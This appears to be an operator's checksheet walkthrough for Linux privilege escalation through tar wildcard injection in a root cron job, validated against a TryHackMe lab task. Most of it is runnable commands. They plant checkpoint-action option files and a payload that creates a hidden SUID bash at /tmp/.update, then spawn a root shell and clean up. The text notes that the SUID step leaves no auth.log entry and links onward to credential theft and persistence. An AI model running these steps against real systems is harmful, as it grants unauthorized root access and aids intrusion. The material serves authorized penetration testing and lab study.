
⚠️ **Hard preconditions — verified in Step 1.**

- **A root cron job invokes a privileged binary with a *bare*, *unquoted* wildcard (`*`)** — whether directly in the cron line or inside a script the cron runs; the binary whose options are injected is the target, not the script. Only a bare `*` expands to option-shaped names (`--checkpoint=1`). A quoted glob (`'*'` / `"*"`) is not expanded at all. A path-prefixed glob (`/path/*`) or `./`-prefixed glob (`./*`) expands to `/path/--checkpoint=1` / `./--checkpoint=1` — leading slash/dot, not recognised as an option — so injection fails. Verified in Step 1.
- **The binary yields an exec primitive from injected option-named files.** `tar` (`--checkpoint-action=exec=`) is the canonical, reliable vector and the one this walkthrough flows end-to-end. `rsync` is situational (only when the cron line includes a remote spec); `chmod`/`chown` (`--reference=`) and `gzip` are _not_ exec vectors — they surface only because the enumerator's grep is deliberately broad. Binary identified in Step 1.
- **The wildcard's expansion directory `<dir>` is writable** by the current user. `<dir>` is both where the option-named files and `<payload>.sh` are planted _and_ the binary's working directory when it runs (so `sh <payload>.sh` resolves relatively). The distinguishing precondition, verified in Step 1.
- **No `--` end-of-options marker precedes the glob** in the cron command. `tar … -- *` disables option parsing for the globbed names → injected `--checkpoint*` filenames are treated as data, not options. Verified in Step 1.
- **Cron will execute within the operator's time budget.** Schedule must be tight enough for live exploitation — typically `* * * * *` or minutes-scale. Daily/weekly/monthly schedules require persistence-window planning.
- **`<cron_user>` is the UID-0 account verified in Step 1.** Commands assume root; if `<cron_user>` is non-root, Step 4 yields that user's privileges (lateral outcome only, not root).
- **Non-destructive.** Step 2 plants new files in `<dir>`; it does not modify the files the cron job archives. The planted files are themselves swept into the produced archive harmlessly. No backup step required.

---

## Step 1 — Preflight

⚠️ `<dir>`, `<file>`, `<line>`, `<body>` are from `WILDCARD[root,cron]: <dir>:<file>:<line>:<body>` in [[Linux Privilege Escalation Checksheet]] `Scheduled execution`. If unknown, return there first.

##### Confirm `<body>` is a real command invocation, not a string or comment:

Read `<body>`. The wildcard binary must be _executed_ on that line — not assigned to a variable (`$PATTERN="tar … *"`), embedded in a here-doc/quoted string, or commented.

- `<body>` is a live command invocation → proceed.
- `<body>` is a variable assignment, quoted string, or comment → false positive. Try the next `WILDCARD` marker; if none, Cron Wildcards not applicable.

##### Identify the binary:

- `tar` → proceed.
- `rsync` → exploitable **only if `<body>` includes a remote spec** (a `host:path` or rsync-daemon `host::module` target that makes rsync invoke a remote shell). Local-only `rsync … *` does not fire `-e`. ⚠️ Payload deferred — rsync flag behaviour pending Kali verification. If a remote spec is present, stop and flag for build-out; otherwise treat as not applicable.
- `chmod`, `chown`, `gzip` → not an exec vector via wildcard. Broad-grep artefact. Try the next `WILDCARD` marker; if none, Cron Wildcards not applicable.

##### Confirm the glob is a bare, unquoted `*` with no `--` before it:

Read `<body>`.

- Glob is a bare `*`, unquoted, with no `--` token before it in the same command → expands to option-shaped names. Injectable. Proceed.
- Glob is quoted (`'*'` / `"*"`) → no shell expansion. Walkthrough not applicable.
- Glob is path-prefixed (`/path/*`) or `./`-prefixed (`./*`) → expands to slash/dot-prefixed names, not recognised as options. Walkthrough not applicable.
- A `--` token precedes the `*` → option parsing disabled for globbed names. Walkthrough not applicable.
##### Expansion directory `<dir>`:

`<dir>` is the resolved value from the WILDCARD marker — the cwd the bare `*` expands against, and where the option files and `<payload>.sh` get planted.

- `<dir>` is an absolute path → use it. Proceed.
- `<dir>` is `UNRESOLVED` → the job's cwd wasn't statically determinable (variable/computed `cd`, relative `cd` with no base, or a run-parts job with no absolute `cd`). Pin the runtime cwd on the box (read the script / the variable's value, or check the job's working directory) before planting; if it can't be pinned to a writable directory, this hit isn't exploitable — try the next `WILDCARD` marker; if none, Cron Wildcards not applicable.
##### Confirm `<dir>` is writable:

`test -w <dir> && echo "WRITABLE" || echo "NOT WRITABLE"`

- `WRITABLE` → proceed.
- `NOT WRITABLE` → planting fails; try the next `WILDCARD` marker, else not applicable.

##### Identify `<cron_interval>` and `<cron_user>`:

- `<file>` is `/etc/crontab` or a `/etc/cron.d/<file>` → `<cron_user>` is the field directly before the command in `<body>` (6-field with user). `<cron_interval>` is everything preceding `<cron_user>` — the five time fields, or a single `@`-string.
- `<file>` is under `/etc/cron.{hourly,daily,weekly,monthly}/` → `<cron_user>` is `root`, and `<cron_interval>` is named by the directory — `cron.hourly` → hourly, `cron.daily` → daily, `cron.weekly` → weekly, `cron.monthly` → monthly.
- `<file>` is `/var/spool/cron/crontabs/<name>` → `<cron_user>` is `<name>` from the filename (5-field, no user in the entry). `<cron_interval>` is everything preceding the command in `<body>` — the five time fields, or a single `@`-string.
- `<file>` is any other script → grep the cron line that calls it:

`grep -H "$(basename <file>)" /etc/crontab /etc/cron.d/* /var/spool/cron/crontabs/* 2>/dev/null`

**Source of the matched line determines `<cron_user>`:**
- `/etc/crontab` or `/etc/cron.d/<file>` → `<cron_user>` is the field directly before the command (e.g `/etc/crontab:* * * * * root /usr/local/bin/compress.sh` → `<cron_user>` is `root`).
- `/var/spool/cron/crontabs/<name>` → `<cron_user>` is `<name>` from the filename (5-field format, no user field in the entry).

**`<cron_interval>` is everything preceding the command OR preceding `<cron_user>`, depending on the file format:**  
- the five time fields, or a single `@`-string (`@hourly`, `@reboot`, …).

##### Confirm UID 0 for `<cron_user>`:

`awk -F: -v u="<cron_user>" '$1 == u && $3 == 0' /etc/passwd`

- Line returned → `<cron_user>` is UID 0; full root achieved at Step 4.
- No output → `<cron_user>` is non-root; Step 4 lands in that user's context (lateral-only outcome).

---

## Step 2 — Plant the malicious files

Three files in `<dir>`: the payload script, and two tar-option filenames. `<payload>.sh` is run as `sh <payload>.sh` by tar's checkpoint action, so it needs no shebang and no execute bit.

`printf 'cp /bin/bash /tmp/.update && chmod +s /tmp/.update\n' > "<dir>/update.sh" && touch -- "<dir>/--checkpoint=1" "<dir>/--checkpoint-action=exec=sh update.sh" && echo "PLANTED" || echo "PLANT FAILED"`

- `PLANTED` → proceed.
- `PLANT FAILED` → write or touch failed despite Step 1's writability check. Re-verify `<dir>` and free space.

Verify all three planted:

`ls -la <dir>`

- Listing shows `update.sh`, `--checkpoint=1`, and `--checkpoint-action=exec=sh update.sh` → proceed to Step 3.
- Any missing → re-check the command. The action filename must reference `update.sh` by the same bare name as the planted script.

---

## Step 3 — Wait for cron execution

Cron's resolution is 1 minute. Earliest execution: at the next minute boundary matching `<cron_interval>`. tar reaches `--checkpoint=1` immediately and fires the action on the first record.

For `* * * * *` wait up to 60 seconds. For `*/5 * * * *` wait up to 5 minutes. Scale accordingly.

Verify:

`ls -la /tmp/.update`

- Output shows owner `root` AND mode contains `s` (e.g. `-rwsr-sr-x`) → action executed by cron as root. Proceed to Step 4.
- File doesn't exist → cron hasn't run yet (wait longer), cron daemon not running, or the glob did not expand bare (re-verify Step 1's bare-`*` and expansion-directory checks — the action filename only injects when tar's argv element is exactly `--checkpoint-action=…`).
- File exists but owner is not root → `<cron_user>` is not root despite Step 1's check. Re-verify Step 1.

---

## Step 4 — Elevate

`/tmp/.update -p`

`id`

- Output contains `euid=0(root)` → root achieved. Effective UID is 0; real UID remaining as the original user is expected for SUID bash with `-p`. Proceed to Step 5.
- `euid` is not 0 → `<cron_user>` was non-root (lateral outcome) or the SUID bit didn't take effect (re-check Step 3's ls output).

---

## Step 5 — Cleanup

All commands below run from the root shell acquired in Step 4.

##### Remove the planted files:

⚠️ `clear;` fires immediately on Enter, wiping any line-wrap display corruption before output prints.

`clear; rm -f -- "<dir>/update.sh" "<dir>/--checkpoint=1" "<dir>/--checkpoint-action=exec=sh update.sh" && echo "PLANT REMOVED" || echo "REMOVE FAILED"`

- `PLANT REMOVED` → the cron job runs cleanly on its next cycle. Proceed.
- `REMOVE FAILED` → files already gone or path mistyped. Verify with `ls -la <dir>`.

##### Remove SUID artifact:

`rm /tmp/.update`

⚠️ The last cron run swept the three planted files into the produced archive — harmless junk, not cleaned here (archive management is out of scope). The cron job continues on its schedule. SUID exec doesn't generate an auth.log entry (kernel-level EUID change, not authentication). Cron logs capture each run via `grep CRON /var/log/syslog` (Debian/Ubuntu) or `/var/log/cron` (RHEL/CentOS); log cleanup is out of scope.

---

## Decision

Root shell achieved. Next steps are goal-dependent; common destinations:

- Credential extraction (additional users' hashes, SSH keys, app secrets) → [[Linux Credential Extraction Checksheet]]
- Persistence (SSH key, cron, systemd) → [[Linux Persistence Checksheet]]
- Lateral movement → [[Linux Lateral Movement Checksheet]]

---

## Validation

- `THM:Linux PrivEsc:Task 10 Cron Jobs - Wildcards`
